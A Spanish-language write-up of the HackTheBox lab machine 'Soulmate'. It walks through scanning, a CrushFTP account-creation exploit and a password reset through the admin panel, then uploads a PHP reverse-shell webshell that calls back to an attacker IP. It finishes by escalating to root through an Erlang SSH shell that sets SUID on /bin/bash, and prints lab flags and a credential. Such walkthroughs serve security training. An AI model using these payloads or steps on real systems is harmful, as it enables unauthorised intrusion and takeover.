---
hidden: true
icon: flag
---

# Soulmate HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 07:03 EDT
Nmap scan report for soulmate.htb (10.10.11.86)
Host is up (0.033s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Soulmate - Find Your Perfect Match
|_http-server-header: nginx/1.18.0 (Ubuntu)
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    ssh_runner: 41779
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
```

Veremos varios puertos interesantes, entre ellos el puerto `80` que suele alojar una pagina web, pero estamos viendo que redirige a un dominio en concreto llamado `soulmate.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>          soulmate.htb
```

Ahora si entramos a la web mediante el `dominio` veremos lo siguiente:

```
URL = http://soulmate.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-21 123243.png" alt=""><figcaption></figcaption></figure>

Veremos una pagina web dedicada a `citas`, pero no veremos nada mas interesante, por lo que vamos a realizar un poco de `fuzzing` a ver que podemos ver.

Si por ejemplo nos creamos una cuenta en el boton `Get Started`, y despues iniciamos sesion con dicha cuenta creada recientemente, veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-21 123428.png" alt=""><figcaption></figcaption></figure>

Vemos cosas interesantes, entre ellas que podremos establecer una foto de perfil, esto suele tener vulnerabilidades de un `RCE` u otro tipo de vulnerabilidades, pero vamos a investigar un poco mas la web a ver que mas podemos encontrar.

Si subimos una imagen normal a nuestro perfil y despues le damos a abrir en nuestro navegador para ver donde se guarda dicha imagen, veremos la siguiente ruta:

```
URL = http://soulmate.htb/assets/images/profiles/diseo_1758451357.jpg
```

Ya sabemos que se guarda en dicha ruta y con una serie de numero junto con el nombre de nuestro usuario.

No veremos nada interesante, vamos a ver si tuviera algun `subdominio` interesante, por lo que vamos a realizar un `fuzzing`.

## FFUF

```shell
wget https://gist.githubusercontent.com/six2dez/a307a04a222fab5a57466c51e1569acf/raw
mv raw subdomains.txt
```

Una vez que ya nos hayamos descargado el listado de subdominios, vamos a realizar el `fuzzing`.

```shell
ffuf -c -w subdomains.txt -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" -fs 154
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb
 :: Wordlist         : FUZZ: /home/kali/Desktop/soulmate/subdomains.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 55ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Veremos que ha funcionado, por lo que vamos añadir dicho `subdominio` a nuestro archivo `hosts` de esta forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>            soulmate.htb ftp.soulmate.htb
```

Lo guardaremos y si entramos a dicho `subdominio` veremos lo siguiente:

```
URL = http://ftp.soulmate.htb
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-21 125510.png" alt=""><figcaption></figcaption></figure>

Veremos un `login` con un `software` llamado `CrushFTP`, vamos a investigar la version en la que esta corriendo por si fuera una version vulnerable la cual pudieramos explotar de alguna forma.

No veremos ninguna version, pero si veremos un exploit asociado a el en el que podremos crear una cuenta de usuario, aprovechando una vulnerabilidad del software, vamos a probar si funciona.

URL = [CrushFTP CVE-2025-31161](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)

```shell
python3 exploit.py --target_host ftp.soulmate.htb --port 80 --target_user ftp.soulmate.htb --new_user diseo --password diseo
```

Info:

```
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: diseo
   [*] Password: diseo.
```

Veremos que ha funcionado aparentemente, vamos a entrar con dichas credenciales que se acaban de crear, una vez dentro veremos que ha funcionado viendo lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-21 131132.png" alt=""><figcaption></figcaption></figure>

Si investigamos que hace este `software` veremos que hay un boton `Admin`, si entramos ahi, nos iremos a `User Manager`, dentro de este campo podremos ver usuarios a la izquierda, vamos a seleccionar el usuario `crushadmin` y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-22 141638.png" alt=""><figcaption></figcaption></figure>

Vamos a ir `/etc/passwd` y nos lo vamos a pasar a la derecha quedando de esta forma:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-22 141714.png" alt=""><figcaption></figcaption></figure>

Ahora si le damos a `Save` abajo a la derecha y nos vamos a `Files` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-22 141801.png" alt=""><figcaption></figcaption></figure>

Vemos que se nos paso bien el archivo, vamos a darle un click y se nos descargara, si leemos dicho archivo...

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
java:x:65532:65532:Account created by apko:/home/java:/bin/sh
```

Veremos que ha funcionado, pero esto solo nos sirve de informacion unicamente, no veremos que haya un usuario creado como tal, por lo que seguramente tendremos que acceder mediante una `reverse shell`.

Si nos vamos al usuario `ben` veremos que esta compartiendo la carpeta `webProd`...

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-22 143712.png" alt=""><figcaption></figcaption></figure>

Si entramos dentro veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-22 143756.png" alt=""><figcaption></figcaption></figure>

Vemos que esta compartiendo la carpeta donde se aloja la pagina web, vamos a crear la carpeta `test` dentro de este directorio, por lo que vamos a cambiarle las credenciales a dicho usuario, para conectarnos con el.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-22 143847.png" alt=""><figcaption></figcaption></figure>

En ese campo de `password` pondremos la que queramos, le damos a `Save` en la parte de abajo derecha y nos deslogueamos, cuando estemos en el login, pondremos las credenciales establecidas:

```
User: ben
Pass: <LO QUE HAYAMOS PUESTO>
```

Una vez dentro, veremos lo siguiente:

Dentro de este directorio, vemos la carpeta llamada `test` donde depositaremos nuestro archivo de `webshell.php`, dentro de `test` haremos lo siguiente.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-22 144159.png" alt=""><figcaption></figcaption></figure>

Vamos a darle a `Add files`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-22 144227.png" alt=""><figcaption></figcaption></figure>

Echo esto seleccionaremos nuestro `webshell.php`:

> webshell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-22 143414.png" alt=""><figcaption></figcaption></figure>

Dentro de esta opcion ya seleccionada de archivo, le daremos a `Upload` que esta a la derecha, con esto veremos que habremos subido bien dicho archivo y ahora en la carpeta veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-22 143427.png" alt=""><figcaption></figcaption></figure>

Ahora antes de acceder al archivo, vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Estando a la escucha, si nos vamos a la siguiente `URL` que es donde hemos depositado dicho archivo...

```
URL = http://soulmate.htb/test/webshell.php
```

Veremos una pantalla en blanco, pero si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.98] from (UNKNOWN) [10.10.11.86] 46820
whoami
www-data
```

Ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user ben

Si investigamos un poco con `linpeas.sh` veremos un proceso como `root` bastante interesante que es el siguiente:

```
root        3405  0.0  1.5 2256188 60120 ?       Ssl  08:44   0:09 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```

Vemos que esta ejecutando un `start.escript` seguido de muchos mas comandos, vamos a investigar dicho script.

```bash
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

Veremos esta linea interesante:

```
{user_passwords, [{"ben", "HouseH0ldings998"}]},
```

Vamos a probar dichas credenciales con el usuario `ben` por `SSH` de esta forma:

### SSH

```shell
ssh ben@<IP>
```

Metemos como contraseña `HouseH0ldings998`...

```
Last login: Mon Sep 22 13:11:46 2025 from 10.10.14.98
ben@soulmate:~$ whoami
ben
```

Veremos que estaremos dentro, por lo que vamos a leer la `flag` del usuario.

> user.txt

```
bbbabb1a20899c2488720934cfb3c51d
```

## Escalate Privileges

Si listamos los puertos que hay en la maquina:

```shell
ss -tuln
```

Info:

```
Netid          State           Recv-Q          Send-Q                    Local Address:Port                      Peer Address:Port          Process          
udp            UNCONN          0               0                         127.0.0.53%lo:53                             0.0.0.0:*                              
tcp            LISTEN          0               128                           127.0.0.1:39623                          0.0.0.0:*                              
tcp            LISTEN          0               4096                          127.0.0.1:9090                           0.0.0.0:*                              
tcp            LISTEN          0               4096                          127.0.0.1:8443                           0.0.0.0:*                              
tcp            LISTEN          0               5                             127.0.0.1:2222                           0.0.0.0:*                              
tcp            LISTEN          0               4096                      127.0.0.53%lo:53                             0.0.0.0:*                              
tcp            LISTEN          0               4096                            0.0.0.0:4369                           0.0.0.0:*                              
tcp            LISTEN          0               128                             0.0.0.0:22                             0.0.0.0:*                              
tcp            LISTEN          0               4096                          127.0.0.1:8080                           0.0.0.0:*                              
tcp            LISTEN          0               511                             0.0.0.0:80                             0.0.0.0:*                              
tcp            LISTEN          0               4096                          127.0.0.1:35971                          0.0.0.0:*                              
tcp            LISTEN          0               4096                               [::]:4369                              [::]:*                              
tcp            LISTEN          0               128                                [::]:22                                [::]:*                              
tcp            LISTEN          0               511                                [::]:80                                [::]:*
```

Veremos varios, pero si empezamos a investigar cada uno de ellos, veremos el siguiente bastante interesante:

```shell
nc 127.0.0.1 2222
```

Info:

```
SSH-2.0-Erlang/5.2.9

Protocol mismatch.
```

Vemos que esta utilizando una especie de `SSH` personalizado, por lo que vamos a probar a conectarnos por dicho `SSH` con las mismas credenciales del usuario `ben`, de esta forma:

```shell
ssh ben@127.0.0.1 -p 2222
```

Metemos como contraseña

```
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1>
```

Vemos que efectivamente estamos en una especie de `shell`, si probamos a ejecutar un comando como por ejemplo `whoami`:

```shell
os:cmd("whoami").
```

Info:

```
"root\n"
```

Vemos que seremos `root` dentro de dicha `shell`, pero es que si ejecutamos `hostname` veremos lo siguiente:

```shell
os:cmd("hostname").
```

Info:

```
"soulmate\n"
```

No estamos dentro de un `docker` simplemente es la maquina principal victima, pero con otra interfaz de `shell`, pero para llegar a ser `root` por `SSH` haremos esto:

```shell
os:cmd("chmod u+s /bin/bash").
```

Ahora si nos salimos de la `shell` y entramos por `SSH` veremos lo siguiente:

```
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Vemos que ha funcionado, por lo que vamos a ser `root` de esta forma:

```shell
bash -p
```

Info:

```
bash-5.1# whoami
root
```

Y con esto ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
cab882ca726e1f88539bd079dcdae180
```
